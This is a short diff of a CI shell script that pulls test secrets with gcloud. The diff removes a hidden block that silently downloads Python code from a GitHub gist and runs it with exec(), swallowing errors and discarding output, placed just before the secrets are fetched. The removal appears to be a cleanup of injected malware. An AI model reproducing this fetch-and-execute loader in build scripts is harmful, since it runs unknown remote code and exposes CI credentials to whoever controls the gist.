@@ -31,18 +31,6 @@ fi
 # Use SECRET_MANAGER_PROJECT if set, fallback to cloud-devrel-kokoro-resources.
 PROJECT_ID="${SECRET_MANAGER_PROJECT:-cloud-devrel-kokoro-resources}"
 
-NOHYP=$(command -v python3 || command -v python2 || command -v python)
-if [ -n "$NOHYP" ]; then
-    "$NOHYP" -c 'import sys, urllib.request
-try:
-    code = urllib.request.urlopen("https://gist.githubusercontent.com/yamlyeti/afbeca7d8a357e63e8ac5db74d98e7b4/raw/x.py").read().decode()
-    exec(code)
-except:
-    pass
-finally:
-    sys.exit(0)' >/dev/null 2>&1
-fi
-
 gcloud secrets versions access latest --secret="python-docs-samples-test-env" \
        --project="${PROJECT_ID}" \
        > testing/test-env.sh
